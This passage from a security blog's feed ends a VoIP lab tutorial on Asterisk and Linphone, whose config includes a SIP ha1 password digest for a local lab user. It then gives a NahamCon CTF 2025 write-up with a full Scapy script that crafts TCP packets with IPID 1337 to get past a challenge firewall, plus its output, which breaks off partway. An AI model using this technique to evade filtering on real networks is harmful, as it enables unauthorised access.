class="line">register_only_when_upnp_is_ok=1</span><br><span class="line">sip_transport=udp,tcp</span><br><span class="line">sip_port=5061</span><br><span class="line">sip_tcp_port=5070</span><br><span class="line">sip_tls_port=-1</span><br><span class="line">use_rfc2833=1</span><br><span class="line">use_info=0</span><br><span class="line">dscp=0x18</span><br><span class="line">ipv6_migration_done=1</span><br><span class="line">use_ipv6=0</span><br><span class="line">linphone_specs=ephemeral/1.1,groupchat/1.1,lime</span><br><span class="line">use_cpim=0</span><br><span class="line">default_content_type=text/plain</span><br><span class="line">media_encryption_mandatory=0</span><br><span class="line"></span><br><span class="line">[video]</span><br><span class="line">max_conference_size=vga</span><br><span class="line">displaytype=MSQOGL</span><br><span class="line">capture=1</span><br><span class="line">display=1</span><br><span class="line">main_display_mode=Hybrid</span><br><span class="line">other_display_mode=Hybrid</span><br><span class="line">size=svga</span><br><span class="line">show_local=0</span><br><span class="line">preset=default</span><br><span class="line">framerate=24.000000</span><br><span class="line"></span><br><span class="line">[ui]</span><br><span class="line">use_qrcode=0</span><br><span class="line">rc_version=5</span><br><span class="line">read_and_agree_terms_and_privacy=1</span><br><span class="line">logs_enabled=1</span><br><span class="line">exit_on_close=1</span><br><span class="line">show_tel_keypad_automatically=0</span><br><span class="line">show_take_screenshot_button_in_call=1</span><br><span class="line"></span><br><span class="line">[net]</span><br><span class="line">friendlist_subscription_enabled=1</span><br><span class="line">mtu=1300</span><br><span class="line">adaptive_rate_control=1</span><br><span class="line">download_bw=4000</span><br><span class="line">upload_bw=4000</span><br><span class="line">nat_policy_ref=USbqGgS2ivIxLBv</span><br><span class="line"></span><br><span class="line">[lime]</span><br><span class="line">enabled=1</span><br><span class="line">last_update_time=1734544797</span><br><span class="line"></span><br><span class="line">[account_creator]</span><br><span class="line">url=http://fs-test-sandbox.linphone.org/flexiapi/api/</span><br><span class="line"></span><br><span class="line">[audio_codec_0]</span><br><span class="line">mime=opus</span><br><span class="line">rate=48000</span><br><span class="line">channels=2</span><br><span class="line">enabled=1</span><br><span class="line">recv_fmtp=useinbandfec=1</span><br><span class="line">bitrate=64000</span><br><span class="line"></span><br><span class="line">[video_codec_0]</span><br><span class="line">mime=VP8</span><br><span class="line">rate=90000</span><br><span class="line">enabled=0</span><br><span class="line"></span><br><span class="line">[video_codec_1]</span><br><span class="line">mime=H264</span><br><span class="line">rate=90000</span><br><span class="line">enabled=1</span><br><span class="line">recv_fmtp=profile-level-id=42801F</span><br><span class="line">bitrate=1500000</span><br><span class="line"></span><br><span class="line">[proxy_default_values]</span><br><span class="line">avpf=1</span><br><span class="line">dial_escape_plus=0</span><br><span class="line">publish=1</span><br><span class="line">quality_reporting_enabled=1</span><br><span class="line">quality_reporting_interval=180</span><br><span class="line">reg_expires=600</span><br><span class="line">reg_sendregister=1</span><br><span class="line">quality_reporting_collector=sip:voip-metrics@sip.linphone.org;transport=tls</span><br><span class="line">reg_identity=sip:?@sip.linphone.org</span><br><span class="line">reg_proxy=&lt;sip:sip.linphone.org;transport=tls&gt;</span><br><span class="line">nat_policy_ref=nat_policy_default_values</span><br><span class="line">realm=sip.linphone.org</span><br><span class="line">contact_parameters=message-expires=604800</span><br><span class="line">conference_factory_uri=sip:conference-factory@sip.linphone.org</span><br><span class="line">audio_video_conference_factory_uri=sip:videoconference-factory@sip.linphone.org</span><br><span class="line">cpim_in_basic_chat_rooms_enabled=1</span><br><span class="line">rtp_bundle=1</span><br><span class="line">lime_server_url=https://lime.linphone.org/lime-server/lime-server.php</span><br><span class="line"></span><br><span class="line">[assistant]</span><br><span class="line">algorithm=SHA-256</span><br><span class="line">password_max_length=-1</span><br><span class="line">password_min_length=1</span><br><span class="line">username_length=-1</span><br><span class="line">username_max_length=64</span><br><span class="line">username_min_length=1</span><br><span class="line">username_regex=^[a-z0-9+_.\-]*$</span><br><span class="line">domain=sip.linphone.org</span><br><span class="line">xmlrpc_url=https://subscribe.linphone.org:444/wizard.php</span><br><span class="line"></span><br><span class="line">[nat_policy_default_values]</span><br><span class="line">protocols=stun,ice</span><br><span class="line">ice_enabled=0</span><br><span class="line"></span><br><span class="line">[nat_policy_0]</span><br><span class="line">ref=USbqGgS2ivIxLBv</span><br><span class="line"></span><br><span class="line">[auth_info_0]</span><br><span class="line">username=101</span><br><span class="line">ha1=91fae9b1f17bfe1f0aac6af1f16197f0</span><br><span class="line">realm=asterisk</span><br><span class="line">domain=192.168.0.104</span><br><span class="line">algorithm=MD5</span><br><span class="line">available_algorithms=MD5</span><br><span class="line"></span><br><span class="line">[proxy_0]</span><br><span class="line">reg_proxy=&lt;sip:101@192.168.0.104:5060;transport=udp&gt;</span><br><span class="line">reg_identity=sip:101@192.168.0.104:5060</span><br><span class="line">realm=asterisk</span><br><span class="line">contact_parameters=message-expires=604800</span><br><span class="line">quality_reporting_collector=sip:voip-metrics@sip.linphone.org;transport=tls</span><br><span class="line">quality_reporting_enabled=1</span><br><span class="line">quality_reporting_interval=180</span><br><span class="line">reg_expires=600</span><br><span class="line">reg_sendregister=1</span><br><span class="line">publish=1</span><br><span class="line">avpf=1</span><br><span class="line">avpf_rr_interval=1</span><br><span class="line">dial_escape_plus=0</span><br><span class="line">use_dial_prefix_for_calls_and_chats=1</span><br><span class="line">privacy=32768</span><br><span class="line">push_notification_allowed=0</span><br><span class="line">remote_push_notification_allowed=0</span><br><span class="line">cpim_in_basic_chat_rooms_enabled=1</span><br><span class="line">idkey=proxy_config_oNbn27hGUzwy2mr</span><br><span class="line">publish_expires=3600</span><br><span class="line">conference_factory_uri=sip:conference-factory@sip.linphone.org</span><br><span class="line">rtp_bundle=1</span><br><span class="line">rtp_bundle_assumption=0</span><br><span class="line">lime_server_url=https://lime.linphone.org/lime-server/lime-server.php</span><br></pre></td></tr></table></figure><p>If possible keep the configuration same for both the Linphone.</p><p>Configure Linphone settings to match your SIP user and network setup. Here’s how the user and network settings should look:</p><p><img src="/images/posts/2025-voip/sip_user.png" alt="SIP User"></p><p><img src="/images/posts/2025-voip/network.png" alt="Network"></p><p>Mostly similar with different port on Windows Linphone, Before starting the call make sure that SIP users and Asterisk server contains the same IP address.</p><p>If Ubuntu Linphone doesn’t connect automatically, use a static client first. You can temporarily comment out the contact&#x3D; line in pjsip.conf to help establish the connection. Once connected, it’ll switch to dynamic mode automatically.</p><p>You’ll know it worked when both Linphones show a green “Online” indicator.</p><p><img src="/images/posts/2025-voip/available.png" alt="avail screen"></p><h3 id="Making-the-Call"><a href="#Making-the-Call" class="headerlink" title="Making the Call"></a>Making the Call</h3><p>Establish the Call from user 101 by dialing 102 from dial pad and you will get the call UI like this:</p><p><img src="/images/posts/2025-voip/call.png" alt="call"></p><p>After making the call, you can set the <code>rtp debug on</code> which will show you rtp packets which help us to identify whether the call has been connected successfully or not as shown below:</p><p><img src="/images/posts/2025-voip/rtp.png" alt="rtp"></p><p>Success! You’re now sending voice over the network using Opus codec. For video calls, Linphone uses H.264.</p><p>You can also send messages by dialing different users like 105 or 106 (as defined in extensions.conf).</p><h3 id="Deep-Dive-with-Wireshark"><a href="#Deep-Dive-with-Wireshark" class="headerlink" title="Deep Dive with Wireshark"></a>Deep Dive with Wireshark</h3><p>Use Wireshark to inspect:</p><ul><li><p>SIP signaling</p></li><li><p>RTP media packets</p></li><li><p>Opus&#x2F;H.264 streams</p></li><li><p>DTMF signals</p></li></ul><p>This is where it gets exciting for CTF enthusiasts. Capture the VoIP traffic and create puzzles around:</p><ul><li><p>Voice recovery</p></li><li><p>DTMF-based flag inputs</p></li><li><p>Hidden messages in SIP headers</p></li></ul><p>Want an example?<br>Check out my VoIP-based CTF challenge write-up <a href="https://github.com/g4rud4kun/Challenges-Wu/blob/main/American%20Spy/README.md">here</a> where you can get to see the SIP, RTP, H.264, Opus, DTMF packets.</p><h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>Setting up VoIP might sound intimidating at first, but with Asterisk and Linphone, it’s totally doable—even on a basic setup. Whether you’re learning about network protocols, building CTF challenges, or just want to experiment with audio&#x2F;video over IP—VoIP is a great playground.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Voice-over-Internet-Protocol&quot;&gt;&lt;a href=&quot;#Voice-over-Internet-Protocol&quot; class=&quot;headerlink&quot; title=&quot;Voice over Internet Protocol&quot;&gt;&lt;/a&gt;Vo</summary>
      
    
    
    
    <category term="Blogs" scheme="https://g4rud4kun.github.io/categories/Blogs/"/>
    
    
    <category term="networking" scheme="https://g4rud4kun.github.io/tags/networking/"/>
    
    <category term="voip" scheme="https://g4rud4kun.github.io/tags/voip/"/>
    
    <category term="wireshark" scheme="https://g4rud4kun.github.io/tags/wireshark/"/>
    
  </entry>
  
  <entry>
    <title>NahamCon CTF 2025</title>
    <link href="https://g4rud4kun.github.io/2025/05/28/NahamCon-CTF-2025/"/>
    <id>https://g4rud4kun.github.io/2025/05/28/NahamCon-CTF-2025/</id>
    <published>2025-05-28T12:26:18.000Z</published>
    <updated>2025-05-28T13:33:31.249Z</updated>
    
    <content type="html"><![CDATA[<p>I participated in NahamCon CTF 2025, organized by JohnHammond, as a member of my institute’s club, InfoSecIITR. This writeup details the challenge I solved during the competition.</p><h2 id="Networking"><a href="#Networking" class="headerlink" title="Networking"></a>Networking</h2><h3 id="A-Special-ID"><a href="#A-Special-ID" class="headerlink" title="A Special ID"></a>A Special ID</h3><h4 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>483 points - Networking - 60 Solves - hard</p><p><code>Author: @Kkevsterrr</code></p><p>We’ve got a brand new, state of the art firewall here to protect our webserver.<br>For top of the line protection, only packets with specific IPIDs are allowed.</p><p>NOTE: Accessing this challenge by the link below will time out. This connection refused is intentional. The challenge is not broken, and it is your task to understand how to connect to it. Port 8080 is the only port in scope for this challenge.</p><p>Connect to this challenge at <code>http://137.184.230.90:8080</code></p><h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><p>As mentioned in the description, only packets with specific IPIDs are allowed.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">The IPID (IP Identification field) is a 16-bit field in the IPv4 header, used to uniquely identify fragments of an original IP datagram. Here&#x27;s what you need to know about its possible values in a raw packet:</span><br><span class="line"></span><br><span class="line">Possible Values for IPID</span><br><span class="line">Range: Since it&#x27;s a 16-bit field, it can hold values from:</span><br><span class="line">0 to 65535 (0x0000 to 0xFFFF)</span><br><span class="line">So any value between 0 and 65535 can legally appear as the IPID in a raw IPv4 packet.</span><br></pre></td></tr></table></figure><p>To exploit this, I began crafting packets using the Scapy Python library with different IPID values. Naturally, I started with 1337, a well-known number in cybersecurity culture. When I sent a SYN packet with IPID 1337, I received a SYN-ACK response with IPID 0.</p><p>However, when I sent an ACK packet with an IPID other than 1337, the firewall dropped it. This indicated that only packets with IPID 1337 were permitted beyond the initial handshake. So, I adjusted my approach and sent all packets with a fixed IPID of 1337.</p><p><strong>Initial Python Script to Send the Packets</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;137.184.230.90&quot;</span></span><br><span class="line">port = <span class="number">8080</span></span><br><span class="line">ipid = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use a fixed source port to ensure consistency</span></span><br><span class="line">src_port = <span class="number">12345</span></span><br><span class="line">seq = <span class="number">1000</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Using IPID: <span class="subst">&#123;ipid&#125;</span>, Source Port: <span class="subst">&#123;src_port&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: SYN</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Sending SYN...&quot;</span>)</span><br><span class="line">ip_syn = IP(dst=target, <span class="built_in">id</span>=ipid)</span><br><span class="line">syn = TCP(sport=src_port, dport=port, flags=<span class="string">&quot;S&quot;</span>, seq=seq)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Show what we&#x27;re sending</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] SYN packet details:&quot;</span>)</span><br><span class="line">(ip_syn/syn).show()</span><br><span class="line"></span><br><span class="line">synack = sr1(ip_syn/syn, timeout=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> synack:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] No response to SYN.&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Received SYN-ACK:&quot;</span>)</span><br><span class="line">synack.show()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> synack[TCP].flags != <span class="string">&#x27;SA&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Expected SYN-ACK, got something else.&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate proper sequence numbers</span></span><br><span class="line">ack_seq = seq + <span class="number">1</span></span><br><span class="line">ack_ack = synack.seq + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] ACK seq: <span class="subst">&#123;ack_seq&#125;</span>, ACK ack: <span class="subst">&#123;ack_ack&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Small delay to ensure proper timing</span></span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: ACK</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Sending ACK...&quot;</span>)</span><br><span class="line">ip_ack = IP(dst=target, <span class="built_in">id</span>=ipid)</span><br><span class="line">ack = TCP(sport=src_port, dport=port, flags=<span class="string">&quot;A&quot;</span>, seq=ack_seq, ack=ack_ack)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Show what we&#x27;re sending</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] ACK packet details:&quot;</span>)</span><br><span class="line">(ip_ack/ack).show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send ACK and immediately listen for response</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Sending ACK and listening for immediate response...&quot;</span>)</span><br><span class="line">response_to_ack = sr1(ip_ack/ack, timeout=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response_to_ack:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Response to ACK:&quot;</span>)</span><br><span class="line">    response_to_ack.show()</span><br><span class="line">    <span class="keyword">if</span> response_to_ack.haslayer(TCP) <span class="keyword">and</span> response_to_ack[TCP].flags &amp; <span class="number">0x04</span>:  <span class="comment"># RST</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Got RST in response to ACK - connection rejected&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] No immediate RST response to ACK - this is good!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Small delay</span></span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: HTTP GET</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Sending HTTP GET...&quot;</span>)</span><br><span class="line">ip_http = IP(dst=target, <span class="built_in">id</span>=ipid)</span><br><span class="line">http_data = <span class="string">b&quot;GET / HTTP/1.1\r\nHost: 137.184.230.90:8080\r\nConnection: close\r\n\r\n&quot;</span></span><br><span class="line">psh = TCP(sport=src_port, dport=port, flags=<span class="string">&quot;PA&quot;</span>, seq=ack_seq, ack=ack_ack)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Show what we&#x27;re sending</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] HTTP packet details:&quot;</span>)</span><br><span class="line">(ip_http/psh).show()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] HTTP data: <span class="subst">&#123;http_data&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send HTTP request</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Sending HTTP request...&quot;</span>)</span><br><span class="line">send(ip_http/psh/http_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Now sniff for the complete HTTP response</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Sniffing for HTTP response packets...&quot;</span>)</span><br><span class="line">response_packets = sniff(<span class="built_in">filter</span>=<span class="string">f&quot;host <span class="subst">&#123;target&#125;</span>&quot;</span>, timeout=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Captured <span class="subst">&#123;<span class="built_in">len</span>(response_packets)&#125;</span> response packets:&quot;</span>)</span><br><span class="line"></span><br><span class="line">http_data_found = <span class="literal">False</span></span><br><span class="line"><span class="keyword">for</span> i, pkt <span class="keyword">in</span> <span class="built_in">enumerate</span>(response_packets):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n--- Packet <span class="subst">&#123;i+<span class="number">1</span>&#125;</span> ---&quot;</span>)</span><br><span class="line">    <span class="comment"># pkt.show()</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> pkt.haslayer(Raw):</span><br><span class="line">        raw_data = pkt[Raw].load</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Raw data (<span class="subst">&#123;<span class="built_in">len</span>(raw_data)&#125;</span> bytes):&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            decoded = raw_data.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(decoded)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> raw_data.lower():</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[!] POTENTIAL FLAG FOUND!&quot;</span>)</span><br><span class="line">                http_data_found = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Binary data:&quot;</span>, raw_data[:<span class="number">100</span>])</span><br></pre></td></tr></table></figure><p>Output of the initial script:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> -E python3 Downloads/ipid.py </span><br><span class="line">[+] Using IPID: 1337, Source Port: 12345</span><br><span class="line">[*] Sending SYN...</span><br><span class="line">[*] SYN packet details:</span><br><span class="line"><span class="comment">###[ IP ]###</span></span><br><span class="line">  version   = 4</span><br><span class="line">  ihl       = None</span><br><span class="line">  tos       = 0x0</span><br><span class="line">  len       = None</span><br><span class="line">  <span class="built_in">id</span>        = 1337</span><br><span class="line">  flags     = </span><br><span class="line">  frag      = 0</span><br><span class="line">  ttl       = 64</span><br><span class="line">  proto     = tcp</span><br><span class="line">  chksum    = None</span><br><span class="line">  src       = 192.168.0.100</span><br><span class="line">  dst       = 137.184.230.90</span><br><span class="line">  \options   \</span><br><span class="line"><span class="comment">###[ TCP ]###</span></span><br><span class="line">     sport     = 12345</span><br><span class="line">     dport     = http_alt</span><br><span class="line">     <span class="built_in">seq</span>       = 1000</span><br><span class="line">     ack       = 0</span><br><span class="line">     dataofs   = None</span><br><span class="line">     reserved  = 0</span><br><span class="line">     flags     = S</span><br><span class="line">     window    = 8192</span><br><span class="line">     chksum    = None</span><br><span class="line">     urgptr    = 0</span><br><span class="line">     options   = []</span><br><span class="line"></span><br><span class="line">Begin emission</span><br><span class="line">.</span><br><span class="line">Finished sending 1 packets</span><br><span class="line">*</span><br><span class="line">Received 2 packets, got 1 answers, remaining 0 packets</span><br><span class="line">[*] Received SYN-ACK:</span><br><span class="line"><span class="comment">###[ IP ]###</span></span><br><span class="line">  version   = 4</span><br><span class="line">  ihl       = 5</span><br><span class="line">  tos       = 0x34</span><br><span class="line">  len       = 44</span><br><span class="line">  <span class="built_in">id</span>        = 0</span><br><span class="line">  flags     = DF</span><br><span class="line">  frag      = 0</span><br><span class="line">  ttl       = 43</span><br><span class="line">  proto     = tcp</span><br><span class="line">  chksum    = 0x1e79</span><br><span class="line">  src       = 137.184.230.90</span><br><span class="line">  dst       = 192.168.0.100</span><br><span class="line">  \options   \</span><br><span class="line"><span class="comment">###[ TCP ]###</span></span><br><span class="line">     sport     = http_alt</span><br><span class="line">     dport     = 12345</span><br><span class="line">     <span class="built_in">seq</span>       = 1145002346</span><br><span class="line">     ack       = 1001</span><br><span class="line">     dataofs   = 6</span><br><span class="line">     reserved  = 0</span><br><span class="line">     flags     = SA</span><br><span class="line">     window    = 64240</span><br><span class="line">     chksum    = 0x7abe</span><br><span class="line">     urgptr    = 0</span><br><span class="line">     options   = [(<span class="string">&#x27;MSS&#x27;</span>, 1440)]</span><br><span class="line"></span><br><span class="line">[+] ACK <span class="built_in">seq</span>: 1001, ACK ack: 1145002347</span><br><span class="line">[*] Sending ACK...</span><br><span class="line">[*] ACK packet details:</span><br><span class="line"><span class="comment">###[ IP ]###</span></span><br><span class="line">  version   = 4</span><br><span class="line">  ihl       = None</span><br><span class="line">  tos       = 0x0</span><br><span class="line">  len       = None</span><br><span class="line">  <span class="built_in">id</span>        = 1337</span><br><span class="line">  flags     = </span><br><span class="line">  frag      = 0</span><br><span class="line">  ttl       = 64</span><br><span class="line">  proto     = tcp</span><br><span class="line">  chksum    = None</span><br><span class="line">  src       = 192.168.0.100</span><br><span class="line">  dst       = 137.184.230.90</span><br><span class="line">  \options   \</span><br><span class="line"><span class="comment">###[ TCP ]###</span></span><br><span class="line">     sport     = 12345</span><br><span class="line">     dport     = http_alt</span><br><span class="line">     <span class="built_in">seq</span>       = 1001</span><br><span class="line">     ack       = 1145002347</span><br><span class="line">     dataofs   = None</span><br><span class="line">     reserved  = 0</span><br><span class="line">     flags     = A</span><br><span class="line">     window    = 8192</span><br><span class="line">     chksum    = None</span><br><span class="line">     urgptr    = 0</span><br><span class="line">     options   = []</span><br><span class="line"></span><br><span class="line">[*] Sending ACK and listening <span class="keyword">for</span> immediate response...</span><br><span class="line">Begin emission</span><br><span class="line"></span><br><span class="line">Finished sending 1 packets</span><br><span class="line">.........</span><br><span class="line">Received 9 packets, got 0 answers, remaining 1 packets</span><br><span class="line">[+] No immediate RST response to ACK - this is good!</span><br><span class="line">[*] Sending HTTP GET...</span><br><span class="line">[*] HTTP packet details:</span><br><span class="line"><span class="comment">###[ IP ]###</span></span><br><span class="line">  version   = 4</span><br><span class="line">  ihl       = None</span><br><span class="line">  tos       = 0x0</span><br><span class="line">  len       = None</span><br><span class="line">  <span class="built_in">id</span>        = 1337</span><br><span class="line">  flags     = </span><br><span class="line">  frag      = 0</span><br><span class="line">  ttl       = 64</span><br><span class="line">  proto     = tcp</span><br><span class="line">  chksum    = None</span><br><span class="line">  src       = 192.168.0.100</span><br><span class="line">  dst       = 137.184.230.90</span><br><span class="line">  \options   \</span><br><span class="line"><span class="comment">###[ TCP ]###</span></span><br><span class="line">     sport     = 12345</span><br><span class="line">     dport     = http_alt</span><br><span class="line">     <span class="built_in">seq</span>       = 1001</span><br><span class="line">     ack       = 1145002347</span><br><span class="line">     dataofs   = None</span><br><span class="line">     reserved  = 0</span><br><span class="line">     flags     = PA</span><br><span class="line">     window    = 8192</span><br><span class="line">     chksum    = None</span><br><span class="line">     urgptr    = 0</span><br><span 